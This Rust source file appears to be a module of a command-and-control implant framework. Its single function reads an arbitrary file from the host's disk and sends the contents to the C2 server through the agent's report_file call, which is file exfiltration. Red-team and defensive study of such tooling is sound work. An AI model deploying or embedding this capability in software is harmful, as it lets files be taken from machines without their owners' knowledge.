use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::{Agent, Context};
use pb::c2::report_file_request;
use pb::{c2, eldritch};

pub fn file(agent: Arc<dyn Agent>, context: Context, path: String) -> Result<(), String> {
    let content = std::fs::read(&path).map_err(|e| e.to_string())?;

    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        ..Default::default()
    };
    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    let context_val = match context {
        Context::Task(tc) => Some(report_file_request::Context::TaskContext(tc)),
        Context::ShellTask(stc) => Some(report_file_request::Context::ShellTaskContext(stc)),
    };

    let req = c2::ReportFileRequest {
        context: context_val,
        chunk: Some(file_msg),
        kind: c2::ReportFileKind::Ondisk as i32,
    };

    agent.report_file(req).map(|_| ())
}
